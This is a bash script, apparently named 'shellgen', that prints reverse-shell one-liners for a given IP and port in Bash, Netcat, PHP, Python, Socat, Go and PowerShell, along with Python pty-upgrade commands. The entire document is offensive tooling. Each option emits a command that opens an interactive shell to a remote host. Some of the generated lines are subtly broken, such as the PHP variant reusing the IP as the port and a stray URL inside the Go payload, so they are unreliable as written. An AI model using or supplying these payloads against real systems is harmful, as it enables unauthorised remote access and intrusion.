#!/bin/bash                                                                                                                                                                                   
                                                                                                                                                                                              
if [ "$1" == "pty" ] && [ $# == "1" ]; then                                                                                                                                                   
        echo -e "\npython -c 'import pty; pty.spawn(\"/bin/bash\")'"
        echo -e "\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"

else

        if [ $# == "2" ]; then
                echo -e "IP : $1 , port : $2"

                echo -e "\nSelect from below options:\n1.Bash\n2.Netcat\n3.PHP\n4.Python\n5.Socat\n6.Golang\n7.Powershell\n"

                read choice

                if [ $choice == "1" ]; then
                        echo -e "\nbash -i >& /dev/tcp/$1/$2 0>&1\n"

                elif [ $choice == "2" ]; then
                        echo -e "\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f\n\n\t\tOR\t\t\n\nnc -e /bin/sh $1 $2\n"

                elif [ $choice == "3" ]; then
                        echo -e "\nphp -r '\$sock=fsockopen("$1",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)\n\n\t\tOR\t\
t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"$1"/$1 0>&1'\");?>\n"

                elif [ $choice == "4" ]; then
                        echo -e "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno()
,1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"

                elif [ $choice == "5" ]; then
                        echo -e "\nsocat tcp:$1:$2 exec:'bash -i' ,pty,stderr,setsid,sigint,sane &\n"

                elif [ $choice == "6" ]; then
                        echo -e "\necho 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$1:$2");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;
http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go\n"

                elif [ $choice == "7" ]; then
                        echo -e "\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$1\",$2);$stream = \$client.GetStream();[byte[]]\$bytes = 0
..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-St
ring );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);$stream.Flush()};$cl
ient.Close()\n"

                fi

        else
                echo -e "Usage\n\tshellgen pty"
                echo -e "\tshellgen ip port"

        fi
fi
